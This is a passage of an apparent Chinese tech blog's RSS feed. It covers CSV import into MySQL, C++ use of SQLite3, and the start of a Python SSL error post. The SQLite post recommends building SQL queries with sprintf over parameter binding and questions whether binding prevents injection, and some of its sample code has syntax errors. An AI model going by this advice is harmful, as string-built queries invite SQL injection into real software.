&lt;/code>&lt;/pre>&lt;ul>
&lt;li>如果你的mysql安装目录下不存在这个文件，你可以尝试去C:/Program Data/MySQL/MySQL Server类似路径下寻找（Program Data文件夹是一个隐藏文件夹，请勾选显示隐藏文件以及文件夹）&lt;/li>
&lt;li>如果还是无法找到可以使用搜索文件功能&lt;/li>
&lt;li>如果完全没有这个文件(&lt;del>作者我帮忙配置mysql的那一部分人应该是完全没有这个文件的&lt;/del>)，则在mysql server的安装路径下新建my.ini,内部基础内容如下&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>[mysqld]
# 这里指定你想要设置的路径，必须保证这个路径存在
secure-file-priv=&amp;#34;E:/test&amp;#34;
[mysql]
default-character-set=utf8
[client]
default-character-set=utf8
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>接下来重启mysql服务&lt;/p>
&lt;p>在具有&lt;strong>管理员权限&lt;/strong>的命令行下输入如下命令&lt;/p>
&lt;pre tabindex="0">&lt;code>net stop mysql
net start mysql
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>接下来进入数据库，输入如下命令&lt;/p>
&lt;pre tabindex="0">&lt;code>show variables like &amp;#34;%secure%&amp;#34;
&lt;/code>&lt;/pre>&lt;p>如果出现的回显中包含你之前设置的路径，则表示路径修改成功过&lt;/p>
&lt;p>&lt;img src="1.jpg" alt="">&lt;/p>
&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>
&lt;h3 id="文件字符编码问题">文件字符编码问题&lt;/h3>
&lt;p>要想成功导入文件，必须保证csv文件编码格式与数据库的编码格式相同。&lt;/p>
&lt;p>mysql是一个复杂的数据库，这里我们从默认编码开始修改。&lt;/p>
&lt;/li>
&lt;/ul>
&lt;ol>
&lt;li>
&lt;p>修改默认字符编码&lt;/p>
&lt;p>依旧是打开my.ini文件，修改文件内容（添加或者查找修改，依据你是创建的文件还是原来就有my.ini文件自行把握）&lt;/p>
&lt;p>修改如下三处（如果某个[xxx]标签下没有则添加）&lt;/p>
&lt;pre tabindex="0">&lt;code>[client]
default-character-set=utf8
[mysql]
default-character-set=utf8
[mysqld]
character-set-server=utf8
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>重启mysql服务&lt;/p>
&lt;p>具有管理员权限的命令行！
具有管理员权限的命令行！
具有管理员权限的命令行！&lt;/p>
&lt;pre tabindex="0">&lt;code>net stop mysql
net start mysql
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>进入数据库查看是否修改成功&lt;/p>
&lt;pre tabindex="0">&lt;code> mysql&amp;gt; SHOW VARIABLES LIKE &amp;#39;character%&amp;#39;;
+--------------------------+---------------------------------------------------------+
| Variable_name            | Value                                                   |
+--------------------------+---------------------------------------------------------+
| character_set_client     | utf8                                                    |
| character_set_connection | utf8                                                    |
| character_set_database   | utf8                                                    |
| character_set_filesystem | binary                                                  |
| character_set_results    | utf8                                                    |
| character_set_server     | utf8                                                    |
| character_set_system     | utf8                                                    |
| character_sets_dir       | C:\Program Files\MySQL\MySQL Server 5.0\share\charsets\ |
+--------------------------+---------------------------------------------------------+
8 rows in set
&lt;/code>&lt;/pre>&lt;p>出现类似如上字样表示修改成功&lt;/p>
&lt;/li>
&lt;li>
&lt;p>修改csv文件的编码为utf-8&lt;/p>
&lt;p>作者本人使用的是VScode转换的编码&lt;/p>
&lt;p>你也可以使用类似的其他编辑器修改(列如notepad++)&lt;/p>
&lt;ol>
&lt;li>
&lt;p>&lt;a href="https://notepad-plus-plus.org/download/">从这里下载notepad++&lt;/a>(如果你打不开就百度瞎几把找一个吧)&lt;/p>
&lt;/li>
&lt;li>
&lt;p>使用notepad++打开csv文件,右下角就会标注这个文件的编码&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>&lt;img src="3.jpg" alt="">&lt;/p>
&lt;ol>
&lt;li>选择编码-&amp;gt;选择转为UTF-8编码,最后保存退出即可&lt;/li>
&lt;/ol>
&lt;p>&lt;img src="4.jpg" alt="">&lt;/p>
&lt;p>&lt;strong>不建议使用txt修改，因为txt的UTF-8格式是带有BOM的，导入时依旧会报错&lt;/strong>&lt;/p>
&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>
&lt;h3 id="导入命令问题">导入命令问题&lt;/h3>
&lt;p>仅仅使用&lt;/p>
&lt;pre tabindex="0">&lt;code>LOAD DATA INFILE &amp;#34;file_name&amp;#34; INTO TABLE tbl_name
&lt;/code>&lt;/pre>&lt;p>是无法完成插入操作的，大概率会出现如下报错&lt;/p>
&lt;pre tabindex="0">&lt;code>Data truncated for column xxx at row 1
&lt;/code>&lt;/pre>&lt;p>因为我们需要指定你准备导入的csv文件格式&lt;/p>
&lt;ul>
&lt;li>完整命令&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>LOAD DATA INFILE &amp;#34;D:/CoderLife/testMySQL/test.csv&amp;#34; -- 指定csv文件路径，路径必须是我们一开始设置的
INTO TABLE nation -- 指定你要插入的表格
FIELDS TERMINATED BY &amp;#39;,&amp;#39; -- 指定csv文件是以逗号为分隔符
ENCLOSED BY &amp;#39;&amp;#34;&amp;#39; -- 指定文本以双引号闭合
LINES TERMINATED BY &amp;#34;\r\n&amp;#34;; -- 指定行按照如上格式换行
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>
&lt;h3 id="拓展补充">拓展补充&lt;/h3>
&lt;ul>
&lt;li>\r 回车符&lt;/li>
&lt;li>\n 换行符&lt;/li>
&lt;li>window环境下文本文件换行多数以“\r\n”为换行符&lt;/li>
&lt;li>Linux环境下的文本文件换行就是以“\n”&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>有关这个导入命令的详解，可以移步&lt;a href="https://blog.csdn.net/haijiege/article/details/78365063">这篇文章&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;h3 id="报错-duplicate-entry-for-key-">报错“ Duplicate entry for key ...”&lt;/h3>
&lt;p>这个报错是因为你之前的表内有数据导致了主键冲突，方法删除旧的表内的内容。&lt;/p>
&lt;pre tabindex="0">&lt;code>delete from table_name
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;h3 id="报错row-does-not-contain-data-for-all-columns">报错“Row does not contain data for all columns”&lt;/h3>
&lt;p>这个报错是因为csv内的数据并没有包含表的所有键值，那么这就需要在我们导入数据的时候指定导入数据数据那几列
就是在之前上面的导入代码最后加上一个括号，里面按照csv数据列的顺序依次标注其键名&lt;/p>
&lt;pre tabindex="0">&lt;code>LOAD DATA INFILE &amp;#34;D:/CoderLife/testMySQL/test.csv&amp;#34; -- 指定csv文件路径，路径必须是我们一开始设置的
INTO TABLE nation -- 指定你要插入的表格
FIELDS TERMINATED BY &amp;#39;,&amp;#39; -- 指定csv文件是以逗号为分隔符
ENCLOSED BY &amp;#39;&amp;#34;&amp;#39; -- 指定文本以双引号闭合
LINES TERMINATED BY &amp;#34;\r\n&amp;#34; -- 指定行按照如上格式换行
(key1,key2,key3); -- 指定你需要导入的键
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;h3 id="报错-incorrect-integer-value-xxx">报错“ Incorrect integer value: xxx”&lt;/h3>
&lt;p>这个报错是因为csv文件第一行存在着表头数据，我们可以数用如下命令忽略第一行&lt;/p>
&lt;pre tabindex="0">&lt;code>LOAD DATA INFILE &amp;#34;D:/CoderLife/testMySQL/test.csv&amp;#34; -- 指定csv文件路径，路径必须是我们一开始设置的
INTO TABLE nation -- 指定你要插入的表格
FIELDS TERMINATED BY &amp;#39;,&amp;#39; -- 指定csv文件是以逗号为分隔符
ENCLOSED BY &amp;#39;&amp;#34;&amp;#39; -- 指定文本以双引号闭合
LINES TERMINATED BY &amp;#34;\r\n&amp;#34; -- 指定行按照如上格式换行
IGNORE 1 LINES -- 指定忽略第一行
(key1,key2,key3); -- 指定你需要导入的键
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;h3 id="关于字符编码问题的补充">关于字符编码问题的补充&lt;/h3>
&lt;p>其实可以通过指定导入的csv文件编码来保证字符编码问题，使用如下命令&lt;/p>
&lt;pre tabindex="0">&lt;code>LOAD DATA INFILE &amp;#34;D:/CoderLife/testMySQL/test.csv&amp;#34; -- 指定csv文件路径，路径必须是我们一开始设置的
INTO TABLE nation CHARACTER SET utf8-- 指定你要插入的表格
FIELDS TERMINATED BY &amp;#39;,&amp;#39; -- 指定csv文件是以逗号为分隔符
ENCLOSED BY &amp;#39;&amp;#34;&amp;#39; -- 指定文本以双引号闭合
LINES TERMINATED BY &amp;#34;\r\n&amp;#34; -- 指定行按照如上格式换行
IGNORE 1 LINES -- 指定忽略第一行
(key1,key2,key3); -- 指定你需要导入的键
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;h2 id="以上所有问题几乎都可以因为使用图形化界面而避免ㄟ---ㄏ">以上所有问题几乎都可以因为使用图形化界面而避免ㄟ( ▔, ▔ )ㄏ&lt;/h2>
&lt;p>意不意外，刺不刺激？？？&lt;/p>
&lt;/li>
&lt;/ul></description><category domain="https://yuukisama.cc/categories/code/">CODE</category><category domain="https://yuukisama.cc/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/">数据库</category></item><item><title>C++与SQLite</title><link>https://yuukisama.cc/posts/code/c-%E4%B8%8Esqlite/</link><guid isPermaLink="true">https://yuukisama.cc/posts/code/c-%E4%B8%8Esqlite/</guid><pubDate>Tue, 14 May 2019 08:47:25 +0000</pubDate><author>chainyuuki@gmail.com (Yuuki)</author><copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright><description>&lt;h2 id="摘要">摘要&lt;/h2>
&lt;ul>
&lt;li>本文主要讲解了C++对接sqlite3数据库的配置以及相关操作&lt;/li>
&lt;li>IDE：Visual Studio 2017&lt;/li>
&lt;li>SQLite3&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="sqlite.jpg" alt="">&lt;/p>
&lt;h2 id="碎碎念">碎碎念&lt;/h2>
&lt;p>敲代码不接触数据库几乎是不可能的。但是很多学校开设的课程都是从Mysql开始的，导致很多学生一些项目就是Mysql。毫无疑问Mysql是很强大的，但是有的时候我们真的很需要因地制宜选择更加合适的数据库。&lt;del>其实还是因为C++&amp;amp;Mysql的模式本垃圾配置不来&lt;/del>&lt;/p>
&lt;h2 id="sqlite3-简介">SQLite3 简介&lt;/h2>
&lt;ul>
&lt;li>SQLite是一个进程内的库，实现了完全的自给自足的，无服务器的，零配置的，事务性的SQL数据库引擎。&lt;/li>
&lt;li>零配置意味着你不需要在任何一台机器上像mysql一样进行复杂的配置&lt;/li>
&lt;li>SQLite正如其名，轻量级，操作方便。毫无疑问相对于功能强大的mysql它缺少了很多相应的其他功能，但是如果你不准备采取分布式结构分离数据应用，复杂的数据库功能，只是需要一个轻量化便捷的数据库基础功能，SQLite是你最好的选择&lt;/li>
&lt;li>&lt;del>嗯，sqlite的c++API也不像mysql的那么变态&lt;/del>&lt;/li>
&lt;/ul>
&lt;h2 id="下载sqlite3">下载SQLite3&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>依据你的需要的系统版本在SQLite官方下载源代码版本 &lt;a href="https://www.sqlite.org/download.html">官方下载界面&lt;/a>&lt;/p>
&lt;p>&lt;img src="1.png" alt="">&lt;/p>
&lt;p>SQLite官方给出了编译好的动态链接库方便开发，不过本教程以源代码入手（因为只要配置正确相较于动态链接库文件，本方法调用更为简单，并且效率更高）&lt;/p>
&lt;/li>
&lt;li>
&lt;p>如图我们选择第一个下载。下载完成之后我们解压到当前文件夹，并修改文件夹为sqlite。把文件夹移动到我们自己的项目里，并在IDE中引入该文件夹。（具体怎么引入瞎几把发挥啦，随你是添加额外项目还是添加额外包含目录，搞通就行hhh）&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h2 id="sqlite3的基础操作">SQLite3的基础操作&lt;/h2>
&lt;ul>
&lt;li>sqlite遵循最基本的通用sql语句。所以大部分操作与mysql等一系列其他数据库无差异&lt;/li>
&lt;li>你可以从sqlite3官网下载exe可执行文件用以访问sqlite生成的数据库文件，在可执行文件内，基础的支持命令如下：
&lt;pre tabindex="0">&lt;code>sqlite3.exe ./test.db //在命令行内使用该命令连接指定数据库文件，不存在则创建
&lt;/code>&lt;/pre>&lt;table>
&lt;thead>
&lt;tr>
&lt;th>命令&lt;/th>
&lt;th>作用&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>.backup ?DB? FILE&lt;/td>
&lt;td>备份 DB 数据库（默认是 &amp;quot;main&amp;quot;）到 FILE 文件。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.bail ON&lt;/td>
&lt;td>OFF&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.databases&lt;/td>
&lt;td>列出数据库的名称及其所依附的文件。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.dump ?TABLE?&lt;/td>
&lt;td>以 SQL 文本格式转储数据库。如果指定了 TABLE 表，则只转储匹配 LIKE 模式的 TABLE 表。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.echo ON&lt;/td>
&lt;td>OFF&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.exit&lt;/td>
&lt;td>退出 SQLite 提示符。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.explain ON&lt;/td>
&lt;td>OFF&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.header(s) ON&lt;/td>
&lt;td>OFF&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.help&lt;/td>
&lt;td>显示帮助消息。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.import FILE TABLE&lt;/td>
&lt;td>导入来自 FILE 文件的数据到 TABLE 表中。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.indices ?TABLE?&lt;/td>
&lt;td>显示所有索引的名称。如果指定了 TABLE 表，则只显示匹配 LIKE 模式的 TABLE 表的索引。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.load FILE ?ENTRY?&lt;/td>
&lt;td>加载一个扩展库。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.log FILE&lt;/td>
&lt;td>off&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.mode MODE&lt;/td>
&lt;td>设置输出模式，MODE 可以是下列之一：&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;ul>
&lt;li>csv 逗号分隔的值&lt;/li>
&lt;li>column 左对齐的列&lt;/li>
&lt;li>html HTML 的 &amp;lt;table&amp;gt; 代码&lt;/li>
&lt;li>insert TABLE 表的 SQL 插入（insert）语句&lt;/li>
&lt;li>line 每行一个值&lt;/li>
&lt;li>list 由 .separator 字符串分隔的值&lt;/li>
&lt;li>tabs 由 Tab 分隔的值&lt;/li>
&lt;li>tcl TCL 列表元素&lt;/li>
&lt;/ul>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>-&lt;/th>
&lt;th>-&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>.nullvalue STRING&lt;/td>
&lt;td>在 NULL 值的地方输出 STRING 字符串。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.output FILENAME&lt;/td>
&lt;td>发送输出到 FILENAME 文件。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.output stdout&lt;/td>
&lt;td>发送输出到屏幕。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.print STRING...&lt;/td>
&lt;td>逐字地输出 STRING 字符串。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.prompt MAIN CONTINUE&lt;/td>
&lt;td>替换标准提示符。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.quit&lt;/td>
&lt;td>退出 SQLite 提示符。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.read FILENAME&lt;/td>
&lt;td>执行 FILENAME 文件中的 SQL。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.schema ?TABLE?&lt;/td>
&lt;td>显示 CREATE 语句。如果指定了 TABLE 表，则只显示匹配 LIKE 模式的 TABLE 表。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.separator STRING&lt;/td>
&lt;td>改变输出模式和 .import 所使用的分隔符。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.show&lt;/td>
&lt;td>显示各种设置的当前值。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.stats ON&lt;/td>
&lt;td>OFF&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.tables ?PATTERN?&lt;/td>
&lt;td>列出匹配 LIKE 模式的表的名称。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.timeout MS&lt;/td>
&lt;td>尝试打开锁定的表 MS 毫秒。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.width NUM NUM&lt;/td>
&lt;td>为 &amp;quot;column&amp;quot; 模式设置列宽度。&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>.timer ON&lt;/td>
&lt;td>OFF&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;/li>
&lt;/ul>
&lt;h2 id="使用c连接sqlite并执行一条sql语句">使用C++连接SQLite并执行一条sql语句&lt;/h2>
&lt;pre tabindex="0">&lt;code>#include&amp;lt;iostream&amp;gt;
#include&amp;lt;sqlite3.h&amp;gt;
using namespace std;
//需要执行的sql语句
const char sql[] = {
&amp;#34;CREATE TABLE IF NOT EXISTS Users(&amp;#34;
&amp;#34;ID INTEGER PRIMARY KEY NOT NULL,&amp;#34;
&amp;#34;Stu_ID INTEGER,&amp;#34;
&amp;#34;Password TEXT&amp;#34;
&amp;#34;);&amp;#34;
};
int main(){
sqlite3 *db=NULL; //数据库句柄
char *ErrMsg=NULL; //错误信息指针
int rc=0; //函数执行返回值
DATABASE=&amp;#34;./test.db&amp;#34;//需要连接的数据库路径
//连接数据库，并将返回的数据库句柄交给db
rc=sqlite3_open(DATABASE,&amp;amp;db);
if (rc){
//如果链接失败关闭句柄退出程序
sqlite3_close(db);
cout&amp;lt;&amp;lt;&amp;#34;Cannot connect to &amp;#34;&amp;lt;&amp;lt;DATABASE&amp;lt;&amp;lt;endl;
return 0;
}
//执行sql语句
rc=sqlite3_exec(db,sql,NULL,NULL,&amp;amp;ErrMsg);
if (rc){
如果执行失败关闭句柄，打印出错误信息，退出程序
sqlite3_close(db);
cout&amp;lt;&amp;lt;&amp;#34;sql execute failed...&amp;#34;&amp;lt;&amp;lt;endl;
cout&amp;lt;&amp;lt;ErrMsg&amp;lt;&amp;lt;endl;
return 0;
}
cout&amp;lt;&amp;lt;&amp;#34;table create&amp;#34;&amp;lt;&amp;lt;endl;
//关闭数据库句柄释放内存
sqlite3_close(db);
return 0;
}
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>
&lt;p>sqlite3_open(const char *filename,sqlite3 **ppDb)&lt;/p>
&lt;p>该函数用以打开指定数据库（不存在则创建），并返回一个数据库连接对象。函数返回值表示执行成功与否。
&lt;strong>如果filename为:memory:，sqlite将会在内存里创建一个数据库&lt;/strong>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>sqlite3_exec(sqlite3* db,const char *sql,sqlite_callback,void *data,char **ErrMsg)&lt;/p>
&lt;p>该函数用以执行sql语句，sql语句可以是一条也可以是多条。&lt;/p>
&lt;ul>
&lt;li>sqlite3* db 数据库连接句柄&lt;/li>
&lt;li>const char *sql 需要执行的sql语句&lt;/li>
&lt;li>sqlite_callback 执行成功后的回调函数&lt;/li>
&lt;li>void *data 回调函数参数&lt;/li>
&lt;li>char **ErrMsg 错误信息&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>sqlite3_close(sqlite3* db)&lt;/p>
&lt;p>该函数用以关闭数据库连接，释放内存。所有相关sql语句都应该在连接关闭之前完成，如果仍有sql语句在执行，该函数将返回SQLITE_BUSY错误&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h2 id="sqlite3回调函数">sqlite3回调函数&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>&lt;a href="https://blog.csdn.net/qq_29924041/article/details/74857469">什么是回调函数&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>SQLite中的回调函数可以让我们自定义sql语句执行完成之后的操作。sqlite3_exec中执行的sql语句的执行结果会被默认传递给回调函数（如果你定义了的话）&lt;/p>
&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>sqlite3_exec(db,&amp;#34;select * from users;&amp;#34;,callback,&amp;#34;helloworld&amp;#34;,&amp;amp;ErrMsg)
//该回调函数将会在sql语句执行时每一行数据返回时被执行
static int callback(void *data,int argc,char **argv,char **azColName){
//同时会打印由sqlite3_exec传入的参数&amp;#34;helloworld&amp;#34;
printf(&amp;#34;%s&amp;#34;,(char*)data);
for(int i=0;i&amp;lt;argc;i++){
printf(&amp;#34;%s : %s\n&amp;#34;,azColName[i],argv[i]?argv[i]:&amp;#34;NULL&amp;#34;);
}
return 0;
}
&lt;/code>&lt;/pre>&lt;h2 id="不用回调函数获取sql结果">不用回调函数获取sql结果&lt;/h2>
&lt;ul>
&lt;li>sqlite的回调函数尽管已经很方便，但是对于某些情景的应用时却力不从心，有什么办法可以不适用回调函数也获取sql的执行结果么？答案是有的&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>void func(){
sqlite3 *db=NULL; //定义数据库句柄
sqlite3_stmt* stmt=NULL;//Statement handle 能令sqlite3_step()执行的编译好的准备语句的指针。调用sqlite3_finalize()删除它。
const char *zTail=NULL; //Pointer to unusedportion of zSql 当zSql在遇见终止符或者达到设定的nByte结束后，如果还有剩余的内容，那么这些剩余的内容将被存放到pzTail中，不包含终止符
const char sql[]=&amp;#34;select ID from users;&amp;#34;
int rc;
rc=sqlite3_open(&amp;#34;./test.db&amp;#34;,&amp;amp;db);
if (rc) return;
//准备sql语句
if (sqlite3_prepare_v2(db,sql,strlen(sql),&amp;amp;stmt,&amp;amp;zTail)==SQLITE_OK){
//步进执行，并获取执行结果
while (sqlite3_step(stmt)==SQLITE_ROW)
print(&amp;#34;%d\n&amp;#34;,sqlite3_column_int(stmt,0));
/*
sqlite3_column_int(stmt,0) 第二个参数表示sql语句返回的数据的列数，从0开始，本例子中的sql语句只选取了ID那一列，所以这里只用数字0
sqlite3_column_text()用以获取字符串类型返回值
sqlite3_column_int64()用以获取int64大小的返回值
*/
}
//释放资源
sqlite3_finalize(stmt);
sqlite3_close(db);
return;
}
&lt;/code>&lt;/pre>&lt;p>sqlite还有很多其他的函数用以获取sql语句执行结果，详情可以参见官方文档&lt;/p>
&lt;h2 id="构造sql语句并执行">构造sql语句并执行&lt;/h2>
&lt;ul>
&lt;li>尽管一旦程序中有接收用户参数动态构造sql语句的程序实现，就通常意味着sql注入漏洞的存在，但是数据库与用户输入数据的交互几乎是不可能不存在的。所以下面我们介绍有关构造sql语句的方法&lt;/li>
&lt;/ul>
&lt;ol>
&lt;li>
&lt;p>使用字符串处理函数（个人安利）&lt;/p>
&lt;p>sql语句本质是一段字符串，所以我们可以直接使用c++自带的字符串处理函数用以绑定参数，动态构造sql语句&lt;/p>
&lt;pre tabindex="0">&lt;code>int id=1;
//首先定义一个字符数组用以存放动态生成的sql语句
char sql[1024]={0};
//使用相对安全的没有缓冲区溢出漏洞的sprintf_s构造sql语句
sprintf_s(sql,1024,&amp;#34;select * from users where ID=%d&amp;#34;,id);
//如果你的编译器不支持sprintf_s()函数，也可使用相对不安全的sprintf()函数
sprintf(sql,&amp;#34;select * from users where ID=%d&amp;#34;,id);
//执行sql语句，这里函数换成sqlite3_prepare_v2()也是一样
sqlite3_exec(db,sql,NULL,NULL,&amp;amp;Errmsg);
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>使用sqlite3自带的绑定参数函数&lt;/p>
&lt;pre tabindex="0">&lt;code>int id=1;
char sql[1024]=&amp;#34;select * from users where ID=?&amp;#34;;
sqlite3_stmt *stmt=NULL;
sqlite3_prepare_v2(db,sql,strlen(sql),&amp;amp;stmt,NULL);
//绑定整形参数到对应位置，参数位置从1开始
sqlite3_bind_int(stmt,1,id);
/*
sqlite3_bind_text(stmt,pos,&amp;#34;halloworld&amp;#34;,strlen(&amp;#34;halloworld&amp;#34;),SQLITE_STATIC)
*/
...
&lt;/code>&lt;/pre>&lt;p>&lt;del>据说&lt;/del>使用sqlite3_bind_*()函数相对使用字符串处理函数更为节省内存，有一定程度可以规避sql注入攻击的效果（这里我感觉不是很苟同，这段是网上说的）&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h2 id="中文字符编码问题">中文字符编码问题&lt;/h2>
&lt;p>Visual studio等一众Win下的IDE，编辑器默认编码不是utf-8，而sqlite3默认的字符编码是utf-8.于是又到了我们喜闻乐见的字符编码问题。这里给大家安利一波函数，方便的进行字符格式转换。&lt;/p>
&lt;p>&lt;strong>请将如下代码全部纳入你的项目中因为函数之间存在相互调用问题&lt;/strong>&lt;/p>
&lt;pre tabindex="0">&lt;code>//UTF-8转Unicode
std::wstring Utf82Unicode(const std::string&amp;amp; utf8string) {
int widesize = ::MultiByteToWideChar(CP_UTF8, 0, utf8string.c_str(), -1, NULL, 0);
if (widesize == ERROR_NO_UNICODE_TRANSLATION)
{
throw std::exception(&amp;#34;Invalid UTF-8 sequence.&amp;#34;);
}
if (widesize == 0)
{
throw std::exception(&amp;#34;Error in conversion.&amp;#34;);
}
std::vector&amp;lt;wchar_t&amp;gt; resultstring(widesize);
int convresult = ::MultiByteToWideChar(CP_UTF8, 0, utf8string.c_str(), -1, &amp;amp;resultstring[0], widesize);
if (convresult != widesize)
{
throw std::exception(&amp;#34;La falla!&amp;#34;);
}
return std::wstring(&amp;amp;resultstring[0]);
}
//unicode 转为 ascii
std::string WideByte2Acsi(std::wstring&amp;amp; wstrcode) {
int asciisize = ::WideCharToMultiByte(CP_OEMCP, 0, wstrcode.c_str(), -1, NULL, 0, NULL, NULL);
if (asciisize == ERROR_NO_UNICODE_TRANSLATION)
{
throw std::exception(&amp;#34;Invalid UTF-8 sequence.&amp;#34;);
}
if (asciisize == 0)
{
throw std::exception(&amp;#34;Error in conversion.&amp;#34;);
}
std::vector&amp;lt;char&amp;gt; resultstring(asciisize);
int convresult = ::WideCharToMultiByte(CP_OEMCP, 0, wstrcode.c_str(), -1, &amp;amp;resultstring[0], asciisize, NULL, NULL);
if (convresult != asciisize)
{
throw std::exception(&amp;#34;La falla!&amp;#34;);
}
return std::string(&amp;amp;resultstring[0]);
}
//utf-8 转 ascii
std::string UTF_82ASCII(std::string&amp;amp; strUtf8Code) {
using namespace std;
string strRet = &amp;#34;&amp;#34;;
//先把 utf8 转为 unicode
wstring wstr = Utf82Unicode(strUtf8Code);
//最后把 unicode 转为 ascii
strRet = WideByte2Acsi(wstr);
return strRet;
}
//ascii 转 Unicode
std::wstring Ascii2WideByte(std::string&amp;amp; strascii) {
using namespace std;
int widesize = MultiByteToWideChar(CP_ACP, 0, (char*)strascii.c_str(), -1, NULL, 0);
if (widesize == ERROR_NO_UNICODE_TRANSLATION)
{
throw std::exception(&amp;#34;Invalid UTF-8 sequence.&amp;#34;);
}
if (widesize == 0)
{
throw std::exception(&amp;#34;Error in conversion.&amp;#34;);
}
std::vector&amp;lt;wchar_t&amp;gt; resultstring(widesize);
int convresult = MultiByteToWideChar(CP_ACP, 0, (char*)strascii.c_str(), -1, &amp;amp;resultstring[0], widesize);
if (convresult != widesize)
{
throw std::exception(&amp;#34;La falla!&amp;#34;);
}
return std::wstring(&amp;amp;resultstring[0]);
}
//Unicode 转 Utf8
std::string Unicode2Utf8(const std::wstring&amp;amp; widestring) {
using namespace std;
int utf8size = ::WideCharToMultiByte(CP_UTF8, 0, widestring.c_str(), -1, NULL, 0, NULL, NULL);
if (utf8size == 0)
{
throw std::exception(&amp;#34;Error in conversion.&amp;#34;);
}
std::vector&amp;lt;char&amp;gt; resultstring(utf8size);
int convresult = ::WideCharToMultiByte(CP_UTF8, 0, widestring.c_str(), -1, &amp;amp;resultstring[0], utf8size, NULL, NULL);
if (convresult != utf8size)
{
throw std::exception(&amp;#34;La falla!&amp;#34;);
}
return std::string(&amp;amp;resultstring[0]);
}
//ascii 转 Utf8
std::string ASCII2UTF_8(std::string&amp;amp; strAsciiCode) {
using namespace std;
string strRet(&amp;#34;&amp;#34;);
//先把 ascii 转为 unicode
wstring wstr = Ascii2WideByte(strAsciiCode);
//最后把 unicode 转为 utf8
strRet = Unicode2Utf8(wstr);
return strRet;
}
&lt;/code>&lt;/pre></description><category domain="https://yuukisama.cc/categories/code/">CODE</category><category domain="https://yuukisama.cc/tags/c/c-/">C/C++</category><category domain="https://yuukisama.cc/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/">数据库</category></item><item><title>Python requests ssl报错</title><link>https://yuukisama.cc/posts/code/python-requests-ssl%E6%8A%A5%E9%94%99/</link><guid isPermaLink="true">https://yuukisama.cc/posts/code/python-requests-ssl%E6%8A%A5%E9%94%99/</guid><pubDate>Tue, 16 Apr 2019 23:23:02 +0000</pubDate><author>chainyuuki@gmail.com (Yuuki)</author><copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright><description>&lt;h2 id="问题背景">问题背景&lt;/h2>
&lt;ul>
&lt;li>这是遇到的一个天坑！ &lt;del>这么过分的坑一定要写下来！！！！&lt;/del>&lt;/li>
&lt;li>项目需求：
&lt;ul>
&lt;li>爬取一个位于国外的网站，所以需要使用proxy，这里使用socks5代理&lt;/li>
&lt;li>网站是https，所以需要ssl&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>就是在这的需求之下，代码持续爆出如下错误：
